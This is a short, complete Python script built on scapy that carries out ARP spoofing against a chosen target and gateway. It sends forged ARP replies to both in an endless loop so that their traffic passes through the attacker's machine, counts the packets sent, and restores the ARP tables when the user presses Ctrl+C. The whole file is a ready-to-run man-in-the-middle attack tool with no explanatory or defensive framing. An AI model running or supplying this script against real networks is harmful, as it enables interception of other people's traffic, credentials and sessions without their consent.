#!/usr/bin/env python

import scapy.all as scapy
import optparse
import time
import sys


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help=" Target IP Address")
    parser.add_option("-g", "--gateway", dest="gateway", help=" Gateway IP address")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an Target IP, use --help for more help")
    elif not options.gateway:
        parser.error("[-] Please specify an Gateway IP, use --help for more help")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff" )
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


option = get_arguments()

try:
    sent_packets_count = 0
    while True:
        spoof(option.target, option.gateway)
        spoof(option.gateway, option.target)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: "+str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detecting CTRL + C ..... Resetting ARP tables..... Please wait\n")
    restore(option.target, option.gateway)


